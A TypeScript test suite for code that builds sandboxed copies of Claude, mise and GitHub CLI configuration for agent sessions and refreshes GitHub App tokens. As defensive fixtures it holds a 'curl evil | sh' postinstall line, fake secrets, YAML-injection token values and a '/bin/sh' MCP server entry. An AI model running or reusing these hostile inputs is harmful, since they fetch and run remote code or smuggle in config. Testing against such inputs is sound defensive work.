import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import {
  chmodSync,
  closeSync,
  existsSync,
  fstatSync,
  mkdirSync,
  mkdtempSync,
  openSync,
  readFileSync,
  rmSync,
  statSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  AGENT_GH_TOKEN_FILE_ENV,
  agentGhTokenFromEnv,
  GH_HOSTS_REFRESH_INTERVAL_MS,
  GhHostsRefresher,
  membraneGhHostsPath,
  previewLogFile,
  prepareMembraneClaudeState,
  ghStoredTokenEnv,
  prepareMembraneGhHosts,
  prepareMembraneMiseConfig,
  resolveMembraneGhBin,
  removeMembraneState,
  sweepMembraneState,
} from "../src/membrane-state";
import { dashify } from "../src/claude-trust";
import {
  AGENT_GH_APP_ID_ENV,
  AGENT_GH_APP_KEY_FILE_ENV,
  GithubAppConfigError,
  makeAgentGhAppToken,
} from "../src/agent-gh-app";
import { generateKeyPairSync } from "node:crypto";
import { CURRENT_GHS_TOKEN } from "./helpers/gh-token-shapes";

let root: string;
let prevXdg: string | undefined;
let home: string;
const cwd = "/repos/proj/.shepherd-worktrees/wt-1";

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), "membrane-state-"));
  home = join(root, "home");
  mkdirSync(join(home, ".claude", "projects"), { recursive: true });
  prevXdg = process.env.XDG_RUNTIME_DIR;
  process.env.XDG_RUNTIME_DIR = join(root, "run");
});

afterEach(() => {
  if (prevXdg === undefined) delete process.env.XDG_RUNTIME_DIR;
  else process.env.XDG_RUNTIME_DIR = prevXdg;
  rmSync(root, { recursive: true, force: true });
});

const inputs = (over: Partial<Parameters<typeof prepareMembraneClaudeState>[0]> = {}) => ({
  home,
  claudeDir: join(home, ".claude"),
  projectsSource: join(home, ".claude", "projects"),
  cwd,
  sessionId: "s-1",
  key: "session",
  ...over,
});

describe("prepareMembraneClaudeState (F04/F06)", () => {
  test("copy is seeded with cwd trust; host .claude.json is untouched, even by writes to the copy", async () => {
    const host = join(home, ".claude.json");
    const original = JSON.stringify({
      hasCompletedOnboarding: true,
      projects: { "/other": { hasTrustDialogAccepted: true } },
    });
    writeFileSync(host, original);

    const copy = await prepareMembraneClaudeState(inputs());
    expect(copy).not.toBeNull();
    expect(copy).not.toBe(host);
    const parsed = JSON.parse(readFileSync(copy!, "utf8"));
    expect(parsed.hasCompletedOnboarding).toBe(true);
    expect(parsed.projects[cwd].hasTrustDialogAccepted).toBe(true);
    expect(parsed.projects["/other"].hasTrustDialogAccepted).toBe(true);

    // What an in-membrane agent would do to the file it sees.
    writeFileSync(copy!, JSON.stringify({ mcpServers: { x: { command: "/bin/sh" } } }));
    expect(readFileSync(host, "utf8")).toBe(original);
    expect(statSync(copy!).mode & 0o777).toBe(0o600);
  });

  test("custom CLAUDE_CONFIG_DIR copies <claudeDir>/.claude.json", async () => {
    const cd = join(root, "pool");
    mkdirSync(cd, { recursive: true });
    writeFileSync(join(cd, ".claude.json"), JSON.stringify({ marker: "pool" }));
    const copy = await prepareMembraneClaudeState(inputs({ claudeDir: cd }));
    expect(JSON.parse(readFileSync(copy!, "utf8")).marker).toBe("pool");
  });

  test("missing host file → null; unparseable → copied verbatim", async () => {
    expect(await prepareMembraneClaudeState(inputs())).toBeNull();
    writeFileSync(join(home, ".claude.json"), "{not json");
    const copy = await prepareMembraneClaudeState(inputs());
    expect(readFileSync(copy!, "utf8")).toBe("{not json");
  });

  test("creates own transcript memory dir and the tmpfs mountpoints", async () => {
    await prepareMembraneClaudeState(inputs());
    expect(existsSync(join(home, ".claude", "projects", dashify(cwd), "memory"))).toBe(true);
    for (const d of ["shell-snapshots", "todos", "statsig"])
      expect(existsSync(join(home, ".claude", d))).toBe(true);
  });

  test("remove + sweep drop copies of dead sessions only", async () => {
    writeFileSync(join(home, ".claude.json"), "{}");
    const a = await prepareMembraneClaudeState(inputs({ sessionId: "live" }));
    const b = await prepareMembraneClaudeState(inputs({ sessionId: "dead" }));
    const c = await prepareMembraneClaudeState(inputs({ sessionId: "gone" }));
    sweepMembraneState(["live", "gone"]);
    expect(existsSync(a!)).toBe(true);
    expect(existsSync(b!)).toBe(false);
    removeMembraneState("gone");
    expect(existsSync(c!)).toBe(false);
  });

  test("previewLogFile: owner-only file under the session dir, removed with it", () => {
    const f = previewLogFile("s-log");
    expect(existsSync(f)).toBe(true);
    expect(statSync(f).mode & 0o777).toBe(0o600);
    expect(previewLogFile("s-log")).toBe(f); // idempotent, keeps content
    removeMembraneState("s-log");
    expect(existsSync(f)).toBe(false);
  });

  test("concurrent same-kind copies never tear the shared file", async () => {
    writeFileSync(join(home, ".claude.json"), JSON.stringify({ big: "x".repeat(200_000) }));
    const copies = await Promise.all(
      Array.from({ length: 8 }, (_, n) =>
        prepareMembraneClaudeState(inputs({ sessionId: "aux", key: "plugin", cwd: `/wt/${n}` })),
      ),
    );
    expect(new Set(copies).size).toBe(1);
    expect(() => JSON.parse(readFileSync(copies[0]!, "utf8"))).not.toThrow();
  });
});

describe("prepareMembraneMiseConfig", () => {
  const writeHostConfig = (toml: string) => {
    mkdirSync(join(home, ".config", "mise"), { recursive: true });
    writeFileSync(join(home, ".config", "mise", "config.toml"), toml);
  };
  const miseInputs = (pinnedBins: (string | null)[] = []) => ({
    home,
    sessionId: "s-1",
    key: "session",
    pinnedBins,
  });
  const installs = () => join(home, ".local", "share", "mise", "installs");

  test("keeps only string/array [tools]; never [env], [settings], [hooks], [tasks]", async () => {
    writeHostConfig(`[env]
SECRET_TOKEN = "sk-hunter2"
_.file = ".env.secret"
_.source = "./secrets.sh"

[tools]
claude = "latest"
gh = "latest"
"npm:skills" = "latest"
python = ["3.12", "3.11"]
rust = { version = "1.99", postinstall = "curl evil | sh" }

[settings]
experimental = true

[hooks]
enter = "echo hi"

[tasks.build]
run = "make"
`);
    const file = await prepareMembraneMiseConfig(miseInputs());
    expect(file).not.toBeNull();
    const raw = readFileSync(file!, "utf8");
    const parsed = Bun.TOML.parse(raw) as Record<string, unknown>;
    expect(Object.keys(parsed)).toEqual(["tools"]);
    expect(parsed.tools).toEqual({
      claude: "latest",
      gh: "latest",
      "npm:skills": "latest",
      python: ["3.12", "3.11"],
    });
    for (const leaked of ["SECRET_TOKEN", "sk-hunter2", ".env.secret", "secrets.sh", "evil"])
      expect(raw.includes(leaked)).toBe(false);
    expect(statSync(file!).mode & 0o777).toBe(0o600);
  });

  test("pins the membrane's mise node/bun, overriding host entries", async () => {
    writeHostConfig(`[tools]\nclaude = "latest"\ngh = "latest"\nbun = "latest"\n`);
    const file = await prepareMembraneMiseConfig(
      miseInputs([
        join(installs(), "node", "26.12.1", "bin", "node"),
        join(installs(), "bun", "1.4.4", "bin", "bun"),
      ]),
    );
    expect(Bun.TOML.parse(readFileSync(file!, "utf8"))).toEqual({
      tools: { claude: "latest", gh: "latest", bun: "1.4.4", node: "26.12.1" },
    });
  });

  test("a bin outside mise gets no pin", async () => {
    writeHostConfig(`[tools]\nclaude = "latest"\n`);
    const file = await prepareMembraneMiseConfig(miseInputs(["/usr/bin/node", null]));
    expect(Bun.TOML.parse(readFileSync(file!, "utf8"))).toEqual({ tools: { claude: "latest" } });
  });

  test("missing or unparseable host config: pins only; nothing at all -> null", async () => {
    const pinned = [join(installs(), "bun", "1.4.4", "bin", "bun")];
    const a = await prepareMembraneMiseConfig(miseInputs(pinned));
    expect(Bun.TOML.parse(readFileSync(a!, "utf8"))).toEqual({ tools: { bun: "1.4.4" } });
    writeHostConfig("[tools\nnot toml");
    const b = await prepareMembraneMiseConfig(miseInputs(pinned));
    expect(Bun.TOML.parse(readFileSync(b!, "utf8"))).toEqual({ tools: { bun: "1.4.4" } });
    expect(await prepareMembraneMiseConfig(miseInputs())).toBeNull();
    writeHostConfig(`[env]\nX = "1"\n`);
    expect(await prepareMembraneMiseConfig(miseInputs())).toBeNull();
  });
});

describe("resolveMembraneGhBin (#3975)", () => {
  const launcher = "/home/me/.local/bin/gh";
  const real = "/home/me/.local/share/mise/installs/gh/2.103.3/bin/gh";
  const deps = (over: Parameters<typeof resolveMembraneGhBin>[0] = {}) => ({
    realpath: async (p: string) =>
      p === "/home/me/.local/share/mise/shims/gh" ? "/usr/bin/mise" : p,
    isScript: async (p: string) => p === launcher,
    miseWhich: async () => real,
    ...over,
  });

  test("skips a launcher script and a mise shim; picks the first real binary on PATH", async () => {
    const whichAll = () => [launcher, "/home/me/.local/share/mise/shims/gh", "/usr/bin/gh"];
    expect(await resolveMembraneGhBin(deps({ whichAll }))).toBe("/usr/bin/gh");
  });

  test("returns the realpath of the chosen binary", async () => {
    const r = await resolveMembraneGhBin(
      deps({ whichAll: () => ["/opt/bin/gh"], realpath: async () => real }),
    );
    expect(r).toBe(real);
  });

  test("only a launcher on PATH → falls back to mise which", async () => {
    expect(await resolveMembraneGhBin(deps({ whichAll: () => [launcher] }))).toBe(real);
  });

  test("null when mise which finds nothing, throws, or returns a script", async () => {
    const whichAll = () => [launcher];
    expect(await resolveMembraneGhBin(deps({ whichAll, miseWhich: async () => null }))).toBeNull();
    const boom = async () => {
      throw new Error("ENOENT mise");
    };
    expect(await resolveMembraneGhBin(deps({ whichAll, miseWhich: boom }))).toBeNull();
    expect(
      await resolveMembraneGhBin(deps({ whichAll, miseWhich: async () => launcher })),
    ).toBeNull();
  });

  test("default script probe reads the real file's shebang", async () => {
    const script = join(root, "gh-launcher");
    const bin = join(root, "gh-bin");
    writeFileSync(script, "#!/bin/bash\nmise use -g gh\n", { mode: 0o755 });
    writeFileSync(bin, "\x7fELF", { mode: 0o755 });
    expect(await resolveMembraneGhBin({ whichAll: () => [script, bin] })).toBe(bin);
  });
});

describe("prepareMembraneGhHosts", () => {
  // Tests without explicit agent-token deps read the env defaults: keep them hermetic.
  const agentEnvVars = [AGENT_GH_TOKEN_FILE_ENV, AGENT_GH_APP_ID_ENV, AGENT_GH_APP_KEY_FILE_ENV];
  let prevAgentEnv: (string | undefined)[] = [];
  beforeEach(() => {
    prevAgentEnv = agentEnvVars.map((k) => process.env[k]);
    for (const k of agentEnvVars) delete process.env[k];
  });
  afterEach(() => {
    agentEnvVars.forEach((k, n) => {
      if (prevAgentEnv[n] === undefined) delete process.env[k];
      else process.env[k] = prevAgentEnv[n];
    });
  });
  const ghInputs = {
    get home() {
      return home;
    },
    sessionId: "s-1",
    key: "session",
    repoPath: "/repos/proj",
  };
  const writeHosts = (yml: string) => {
    mkdirSync(join(home, ".config", "gh"), { recursive: true });
    writeFileSync(join(home, ".config", "gh", "hosts.yml"), yml);
  };
  const keyringHosts = `github.com:
    users:
        scoop: {}
    git_protocol: https
    user: scoop
`;

  test("keyring-stored token -> 0600 hosts.yml carrying it (top level + users.<user>)", async () => {
    writeHosts(keyringHosts);
    const file = await prepareMembraneGhHosts(ghInputs, { ghToken: async () => "gho_abc123\n" });
    expect(file).not.toBeNull();
    expect(readFileSync(file!, "utf8")).toBe(`github.com:
    users:
        scoop:
            oauth_token: gho_abc123
    git_protocol: https
    user: scoop
    oauth_token: gho_abc123
`);
    expect(statSync(file!).mode & 0o777).toBe(0o600);
    // The host file is untouched.
    expect(readFileSync(join(home, ".config", "gh", "hosts.yml"), "utf8")).toBe(keyringHosts);
  });

  test("host file already holds a token -> null, runner not called", async () => {
    writeHosts(`github.com:\n    oauth_token: gho_file\n    user: scoop\n`);
    let called = false;
    const r = await prepareMembraneGhHosts(ghInputs, {
      ghToken: async () => ((called = true), "gho_x"),
    });
    expect(r).toBeNull();
    expect(called).toBe(false);
  });

  test("missing hosts.yml -> null, runner not called", async () => {
    let called = false;
    const r = await prepareMembraneGhHosts(ghInputs, {
      ghToken: async () => ((called = true), "gho_x"),
    });
    expect(r).toBeNull();
    expect(called).toBe(false);
  });

  test("runner throws, returns empty or a non-token -> null", async () => {
    writeHosts(keyringHosts);
    const fail = async () => {
      throw new Error("no keyring");
    };
    expect(await prepareMembraneGhHosts(ghInputs, { ghToken: fail })).toBeNull();
    expect(await prepareMembraneGhHosts(ghInputs, { ghToken: async () => "" })).toBeNull();
    expect(
      await prepareMembraneGhHosts(ghInputs, { ghToken: async () => "x\n    user: evil" }),
    ).toBeNull();
  });

  const noOperatorToken = async (): Promise<string> => {
    throw new Error("operator token must not be read");
  };
  const operatorFileHosts = `github.com:\n    oauth_token: gho_operator\n    git_protocol: https\n    user: scoop\n`;

  test("agent token configured -> override carries it, operator token never read", async () => {
    writeHosts(keyringHosts);
    const file = await prepareMembraneGhHosts(ghInputs, {
      agentGhToken: async () => "github_pat_11ABC_def\n",
      ghToken: noOperatorToken,
    });
    expect(readFileSync(file!, "utf8")).toBe(`github.com:
    users:
        scoop:
            oauth_token: github_pat_11ABC_def
    git_protocol: https
    user: scoop
    oauth_token: github_pat_11ABC_def
`);
    expect(statSync(file!).mode & 0o777).toBe(0o600);
  });

  test("agent token also overrides a host file that stores the operator token", async () => {
    writeHosts(operatorFileHosts);
    const file = await prepareMembraneGhHosts(ghInputs, {
      agentGhToken: async () => "ghs_app123",
      ghToken: noOperatorToken,
    });
    const yml = readFileSync(file!, "utf8");
    expect(yml).toContain("oauth_token: ghs_app123");
    expect(yml).not.toContain("gho_operator");
  });

  test("agent token configured but unusable -> token-less override, no operator fallback", async () => {
    const tokenless = `github.com:
    users:
        scoop: {}
    git_protocol: https
    user: scoop
`;
    for (const agentGhToken of [
      async () => {
        throw new Error("chmod 600");
      },
      async () => "x\n    user: evil",
    ]) {
      writeHosts(operatorFileHosts);
      const file = await prepareMembraneGhHosts(ghInputs, {
        agentGhToken,
        ghToken: noOperatorToken,
      });
      expect(readFileSync(file!, "utf8")).toBe(tokenless);
    }
  });

  test("no agent token configured -> operator behaviour unchanged", async () => {
    writeHosts(keyringHosts);
    const file = await prepareMembraneGhHosts(ghInputs, {
      agentGhAppToken: async () => null,
      agentGhToken: async () => null,
      ghToken: async () => "gho_abc123",
    });
    expect(readFileSync(file!, "utf8")).toContain("oauth_token: gho_abc123");
  });

  const noTokenFile = async (): Promise<string | null> => {
    throw new Error("token file must not be read");
  };

  test("App mode -> token minted for the session repo wins over token file + operator", async () => {
    writeHosts(operatorFileHosts);
    let askedFor: string | undefined;
    const file = await prepareMembraneGhHosts(ghInputs, {
      agentGhAppToken: async (repoPath) => (
        (askedFor = repoPath),
        { token: "ghs_minted123", expiresAt: Date.now() + 3_600_000 }
      ),
      agentGhToken: noTokenFile,
      ghToken: noOperatorToken,
    });
    expect(askedFor).toBe("/repos/proj");
    const yml = readFileSync(file!, "utf8");
    expect(yml).toContain("oauth_token: ghs_minted123");
    expect(yml).not.toContain("gho_operator");
    expect(statSync(file!).mode & 0o777).toBe(0o600);
  });

  test("App mode -> a current-format installation token (dotted base64url) is written", async () => {
    writeHosts(operatorFileHosts);
    const file = await prepareMembraneGhHosts(ghInputs, {
      agentGhAppToken: async () => ({
        token: CURRENT_GHS_TOKEN,
        expiresAt: Date.now() + 3_600_000,
      }),
      agentGhToken: noTokenFile,
      ghToken: noOperatorToken,
    });
    const yml = readFileSync(file!, "utf8");
    expect(yml).toContain(`oauth_token: ${CURRENT_GHS_TOKEN}\n`);
    expect(yml).not.toContain("gho_operator");
  });

  test("App mode configured but failing -> token-less override, reason warned, no fallback", async () => {
    const warns: string[] = [];
    const origWarn = console.warn;
    console.warn = (...a: unknown[]) => void warns.push(a.map(String).join(" "));
    try {
      for (const agentGhAppToken of [
        async (): Promise<null> => {
          throw new Error("GitHub App is not installed on o/r (HTTP 404)");
        },
        async () => ({ token: "x\n    user: evil", expiresAt: Date.now() + 3_600_000 }),
        async () => ({ token: "-ghs_leading_dash", expiresAt: Date.now() + 3_600_000 }),
      ]) {
        writeHosts(operatorFileHosts);
        const file = await prepareMembraneGhHosts(ghInputs, {
          agentGhAppToken,
          agentGhToken: noTokenFile,
          ghToken: noOperatorToken,
        });
        const yml = readFileSync(file!, "utf8");
        expect(yml).not.toContain("oauth_token");
        expect(yml).toContain("scoop: {}");
      }
    } finally {
      console.warn = origWarn;
    }
    expect(warns[0]).toContain("not installed on o/r (HTTP 404)");
    expect(warns[1]).toContain("malformed");
  });

  test("App mode not configured -> token file still applies", async () => {
    writeHosts(keyringHosts);
    const file = await prepareMembraneGhHosts(ghInputs, {
      agentGhAppToken: async () => null,
      agentGhToken: async () => "github_pat_11ABC_def",
      ghToken: noOperatorToken,
    });
    expect(readFileSync(file!, "utf8")).toContain("oauth_token: github_pat_11ABC_def");
  });

  const minted = async () => ({ token: "ghs_minted123", expiresAt: Date.now() + 3_600_000 });

  test("agent token + host ~/.config/gh without hosts.yml -> per-spawn file still written", async () => {
    mkdirSync(join(home, ".config", "gh"), { recursive: true });
    writeFileSync(join(home, ".config", "gh", "config.yml"), 'version: "1"\n');
    for (const deps of [
      { agentGhAppToken: minted, agentGhToken: noTokenFile },
      { agentGhAppToken: async () => null, agentGhToken: async () => "ghs_minted123" },
    ]) {
      const file = await prepareMembraneGhHosts(ghInputs, { ...deps, ghToken: noOperatorToken });
      expect(readFileSync(file!, "utf8")).toBe("github.com:\n    oauth_token: ghs_minted123\n");
      expect(statSync(file!).mode & 0o777).toBe(0o600);
    }
  });

  test("App mode + no ~/.config/gh at all -> per-spawn file written; failure -> token-less", async () => {
    expect(existsSync(join(home, ".config", "gh"))).toBe(false);
    const file = await prepareMembraneGhHosts(ghInputs, {
      agentGhAppToken: minted,
      agentGhToken: noTokenFile,
      ghToken: noOperatorToken,
    });
    expect(readFileSync(file!, "utf8")).toBe("github.com:\n    oauth_token: ghs_minted123\n");
    const origWarn = console.warn;
    console.warn = () => {};
    try {
      const failed = await prepareMembraneGhHosts(ghInputs, {
        agentGhAppToken: async () => {
          throw new GithubAppConfigError("App not installed");
        },
        ghToken: noOperatorToken,
      });
      expect(readFileSync(failed!, "utf8")).toBe("github.com:\n");
    } finally {
      console.warn = origWarn;
    }
  });

  test("env default: App mode half-configured -> token-less, token file ignored", async () => {
    writeHosts(operatorFileHosts);
    process.env[AGENT_GH_APP_ID_ENV] = "12345";
    const file = await prepareMembraneGhHosts(ghInputs, {
      agentGhToken: noTokenFile,
      ghToken: noOperatorToken,
    });
    expect(readFileSync(file!, "utf8")).not.toContain("oauth_token");
  });
});

describe("GhHostsRefresher (App-token refresh of a live membrane)", () => {
  const keyringHosts = `github.com:
    users:
        scoop: {}
    git_protocol: https
    user: scoop
`;
  const withToken = (t: string) => `github.com:
    users:
        scoop:
            oauth_token: ${t}
    git_protocol: https
    user: scoop
    oauth_token: ${t}
`;
  const T0 = Date.parse("2026-11-23T12:00:00Z");
  const MIN = 60_000;
  const tok = (n: number) => `ghs_${String(n).repeat(36).slice(0, 36)}`;
  /** A live spawn: host hosts.yml + this session's per-spawn file holding `token`. */
  const spawned = (token: string) => {
    mkdirSync(join(home, ".config", "gh"), { recursive: true });
    writeFileSync(join(home, ".config", "gh", "hosts.yml"), keyringHosts);
    const file = membraneGhHostsPath("s-1");
    mkdirSync(join(file, ".."), { recursive: true });
    writeFileSync(file, withToken(token), { mode: 0o600 });
    return { home, sessionId: "s-1", repoPath: "/repos/proj", file };
  };
  /** Fake timers: `every` records each loop's tick + interval. */
  const fakeTimers = () => {
    const loops: { fn: () => void; ms: number; cancelled: boolean }[] = [];
    return {
      loops,
      every: (fn: () => void, ms: number) => {
        const l = { fn, ms, cancelled: false };
        loops.push(l);
        return () => void (l.cancelled = true);
      },
    };
  };
  /** Collect console.warn lines while `fn` runs. */
  const warnsOf = async (fn: () => Promise<void>) => {
    const warns: string[] = [];
    const orig = console.warn;
    console.warn = (...a: unknown[]) => void warns.push(a.map(String).join(" "));
    try {
      await fn();
    } finally {
      console.warn = orig;
    }
    return warns;
  };
  type Source = () => Promise<{ token: string; expiresAt: number } | null>;
  /** A refresher on a fake clock whose App token source is whatever `source.next` says. */
  const harness = (initial: Source) => {
    const clock = { now: T0 };
    const source = { next: initial };
    const timers = fakeTimers();
    const r = new GhHostsRefresher({
      appModeConfigured: () => true,
      agentGhAppToken: () => source.next(),
      now: () => clock.now,
      every: timers.every,
    });
    return { r, clock, source, timers };
  };
  const grant = (n: number, expiresAt: number) => async () => ({ token: tok(n), expiresAt });
  const fail = (err: Error) => async () => {
    throw err;
  };
  const text = (file: string) => readFileSync(file, "utf8").trimEnd();
  /** Content + inode/mode/size from ONE open handle — no path-based stat-then-read race. */
  const snap = (file: string) => {
    const fd = openSync(file, "r");
    try {
      const st = fstatSync(fd);
      return { text: readFileSync(fd, "utf8"), ino: st.ino, mode: st.mode, size: st.size };
    } finally {
      closeSync(fd);
    }
  };

  test("App mode off -> no loop, file untouched", async () => {
    const target = spawned(tok(1));
    const timers = fakeTimers();
    const r = new GhHostsRefresher({
      appModeConfigured: () => false,
      agentGhAppToken: async () => {
        throw new Error("must not mint");
      },
      every: timers.every,
    });
    r.start(target);
    await r.refresh("s-1");
    expect(timers.loops).toHaveLength(0);
    expect(r.isRunning("s-1")).toBe(false);
    expect(readFileSync(target.file, "utf8")).toBe(withToken(tok(1)));
  });

  test("start refreshes at once; a tick rewrites the same path + inode, 0600 kept", async () => {
    const target = spawned(tok(1));
    const ino = snap(target.file).ino;
    const h = harness(grant(1, T0 + 60 * MIN));
    h.r.start(target);
    await h.r.refresh("s-1");
    expect(snap(target.file).text).toBe(withToken(tok(1))); // unchanged: no write
    expect(h.timers.loops).toHaveLength(1);
    expect(h.timers.loops[0]!.ms).toBe(GH_HOSTS_REFRESH_INTERVAL_MS);
    h.source.next = grant(2, T0 + 100 * MIN);
    h.timers.loops[0]!.fn();
    await h.r.refresh("s-1"); // joins the in-flight tick
    const after = snap(target.file);
    expect(after.text).toBe(withToken(tok(2)));
    expect(after.ino).toBe(ino);
    expect(after.mode & 0o777).toBe(0o600);
  });

  test("one loop per session: a resume's start retargets instead of adding a loop", async () => {
    const target = spawned(tok(1));
    const h = harness(grant(1, T0 + 60 * MIN));
    h.r.start(target);
    h.r.start({ ...target });
    await h.r.refresh("s-1");
    expect(h.timers.loops).toHaveLength(1);
  });

  test("transient failure keeps the still-valid token (warned once), then recovers", async () => {
    const target = spawned(tok(1));
    const h = harness(grant(1, T0 + 60 * MIN));
    h.r.start(target);
    await h.r.refresh("s-1");
    const warns = await warnsOf(async () => {
      for (const err of [
        new Error("GitHub App token mint for o/r: HTTP 502"),
        new Error("GitHub App token mint failed: timed out"),
      ]) {
        h.clock.now += 5 * MIN;
        h.source.next = fail(err);
        await h.r.refresh("s-1");
        expect(readFileSync(target.file, "utf8")).toBe(withToken(tok(1)));
      }
      h.clock.now += 5 * MIN;
      await h.r.refresh("s-1"); // same failure again: no new warning
    });
    expect(warns).toHaveLength(2);
    expect(warns[0]).toContain("keeping the current token");
    expect(warns[0]).toContain("HTTP 502");
    h.source.next = grant(2, T0 + 120 * MIN);
    await h.r.refresh("s-1");
    expect(readFileSync(target.file, "utf8")).toBe(withToken(tok(2)));
  });

  test("transient failure within the safety margin -> token-less in place (padded, same inode)", async () => {
    const target = spawned(tok(1));
    const before = snap(target.file);
    const h = harness(grant(1, T0 + 30 * MIN));
    h.r.start(target);
    await h.r.refresh("s-1");
    h.clock.now = T0 + 26 * MIN; // 4 min left
    h.source.next = fail(new Error("GitHub App token mint for o/r: HTTP 503"));
    const warns = await warnsOf(() => h.r.refresh("s-1"));
    const after = snap(target.file);
    expect(after.text.trimEnd()).toBe(keyringHosts.trimEnd());
    expect(after.size).toBe(before.size); // never shrinks: no torn/empty read
    expect(after.ino).toBe(before.ino);
    expect(warns[0]).toContain(
      "membrane gets no gh token: GitHub App token mint for o/r: HTTP 503",
    );
  });

  test("transient failure with no vouched-for token (first refresh) -> token-less", async () => {
    const target = spawned(tok(1));
    const h = harness(fail(new Error("GitHub App installation lookup failed: timed out")));
    await warnsOf(async () => {
      h.r.start(target);
      await h.r.refresh("s-1");
    });
    expect(text(target.file)).toBe(keyringHosts.trimEnd());
  });

  test("App config unusable or App mode gone -> token-less at once, despite time left", async () => {
    for (const next of [
      fail(
        new GithubAppConfigError("SHEPHERD_AGENT_GH_APP_KEY_FILE: /k is readable by group/other"),
      ),
      fail(new GithubAppConfigError("GitHub App is not installed on o/r (HTTP 404)")),
      async () => null,
    ]) {
      const target = spawned(tok(1));
      const h = harness(grant(1, T0 + 60 * MIN));
      h.r.start(target);
      await h.r.refresh("s-1");
      h.source.next = next;
      const warns = await warnsOf(() => h.r.refresh("s-1"));
      expect(text(target.file)).toBe(keyringHosts.trimEnd());
      expect(warns[0]).toContain("membrane gets no gh token");
      h.r.stop("s-1");
    }
  });

  test("real minter: a 404 on re-mint drops the token at once; a 502 keeps it", async () => {
    const { privateKey } = generateKeyPairSync("rsa", { modulusLength: 2048 });
    for (const [status, kept] of [
      [404, false],
      [502, true],
    ] as const) {
      const target = spawned(tok(1));
      const clock = { now: T0 };
      let mintStatus = 201;
      const fetchFn = (async (url: string | URL | Request) => {
        if (String(url).endsWith("/installation")) return Response.json({ id: 42 });
        if (mintStatus !== 201) return Response.json({ message: "nope" }, { status: mintStatus });
        return Response.json(
          { token: tok(1), expires_at: new Date(T0 + 60 * MIN).toISOString() },
          { status: 201 },
        );
      }) as typeof fetch;
      const source = makeAgentGhAppToken({
        env: { [AGENT_GH_APP_ID_ENV]: "12345", [AGENT_GH_APP_KEY_FILE_ENV]: "/k.pem" },
        fetch: fetchFn,
        now: () => clock.now,
        loadKey: async () => privateKey,
        githubRepo: () => ({ owner: "o", name: "r" }),
      });
      const r = new GhHostsRefresher({
        appModeConfigured: () => true,
        agentGhAppToken: source,
        now: () => clock.now,
        every: fakeTimers().every,
      });
      r.start(target);
      await r.refresh("s-1");
      clock.now = T0 + 41 * MIN; // inside the reuse margin: re-mint
      mintStatus = status;
      await warnsOf(() => r.refresh("s-1"));
      expect(readFileSync(target.file, "utf8").includes(`oauth_token: ${tok(1)}`)).toBe(kept);
      r.stop("s-1");
    }
  });

  test("malformed minted token counts as transient", async () => {
    const target = spawned(tok(1));
    const h = harness(grant(1, T0 + 60 * MIN));
    h.r.start(target);
    await h.r.refresh("s-1");
    h.source.next = async () => ({ token: "x\n    user: evil", expiresAt: T0 + 90 * MIN });
    await warnsOf(() => h.r.refresh("s-1"));
    expect(readFileSync(target.file, "utf8")).toBe(withToken(tok(1)));
  });

  test("a current-format installation token (dotted base64url) is written, no warning", async () => {
    const target = spawned(tok(1));
    const h = harness(async () => ({ token: CURRENT_GHS_TOKEN, expiresAt: T0 + 60 * MIN }));
    const warns = await warnsOf(async () => {
      h.r.start(target);
      await h.r.refresh("s-1");
    });
    expect(warns).toEqual([]);
    expect(readFileSync(target.file, "utf8")).toBe(withToken(CURRENT_GHS_TOKEN));
    h.r.stop("s-1");
  });

  test("stop cancels the timer; later ticks and an in-flight refresh leave the file alone", async () => {
    const target = spawned(tok(1));
    let release!: (g: { token: string; expiresAt: number }) => void;
    const h = harness(() => new Promise((res) => (release = res)));
    h.r.start(target); // in flight
    h.r.stop("s-1");
    expect(h.timers.loops[0]!.cancelled).toBe(true);
    expect(h.r.isRunning("s-1")).toBe(false);
    release({ token: tok(2), expiresAt: T0 + 60 * MIN });
    await Bun.sleep(1);
    await h.r.refresh("s-1"); // no loop: no-op
    expect(readFileSync(target.file, "utf8")).toBe(withToken(tok(1)));
  });

  test("membrane state removed -> the loop stops itself, file not resurrected", async () => {
    const target = spawned(tok(1));
    const h = harness(grant(1, T0 + 60 * MIN));
    h.r.start(target);
    await h.r.refresh("s-1");
    removeMembraneState("s-1");
    h.source.next = grant(2, T0 + 100 * MIN);
    h.timers.loops[0]!.fn();
    await h.r.refresh("s-1");
    expect(h.r.isRunning("s-1")).toBe(false);
    expect(h.timers.loops[0]!.cancelled).toBe(true);
    expect(existsSync(target.file)).toBe(false);
  });

  test("no per-spawn file -> no loop", () => {
    const timers = fakeTimers();
    const r = new GhHostsRefresher({ appModeConfigured: () => true, every: timers.every });
    r.start({ home, sessionId: "s-2", repoPath: "/r", file: membraneGhHostsPath("s-2") });
    expect(timers.loops).toHaveLength(0);
  });
});

describe("agentGhTokenFromEnv", () => {
  const tokenFile = (content: string, mode: number) => {
    const p = join(root, "agent-token");
    writeFileSync(p, content);
    chmodSync(p, mode);
    return p;
  };

  test("unset or blank -> null", async () => {
    expect(await agentGhTokenFromEnv({})).toBeNull();
    expect(await agentGhTokenFromEnv({ [AGENT_GH_TOKEN_FILE_ENV]: "  " })).toBeNull();
  });

  test("0600 file with one token -> the token", async () => {
    const p = tokenFile("github_pat_11ABC_def\n", 0o600);
    expect(await agentGhTokenFromEnv({ [AGENT_GH_TOKEN_FILE_ENV]: p })).toBe(
      "github_pat_11ABC_def",
    );
  });

  test("group/other-readable, missing, directory or junk -> throws", async () => {
    const loose = tokenFile("ghs_x", 0o644);
    await expect(agentGhTokenFromEnv({ [AGENT_GH_TOKEN_FILE_ENV]: loose })).rejects.toThrow(
      "chmod 600",
    );
    await expect(
      agentGhTokenFromEnv({ [AGENT_GH_TOKEN_FILE_ENV]: join(root, "nope") }),
    ).rejects.toThrow();
    await expect(agentGhTokenFromEnv({ [AGENT_GH_TOKEN_FILE_ENV]: root })).rejects.toThrow(
      "not a regular file",
    );
    const junk = tokenFile("a b\nc", 0o600);
    await expect(agentGhTokenFromEnv({ [AGENT_GH_TOKEN_FILE_ENV]: junk })).rejects.toThrow(
      "single gh token",
    );
  });
});

test("ghStoredTokenEnv drops every gh token env var, keeps the rest", () => {
  const env = {
    PATH: "/usr/bin",
    HOME: "/home/me",
    GH_TOKEN: "a",
    GITHUB_TOKEN: "b",
    GH_ENTERPRISE_TOKEN: "c",
    GITHUB_ENTERPRISE_TOKEN: "d",
  };
  expect(ghStoredTokenEnv(env)).toEqual({ PATH: "/usr/bin", HOME: "/home/me" });
  expect(env.GH_TOKEN).toBe("a");
});
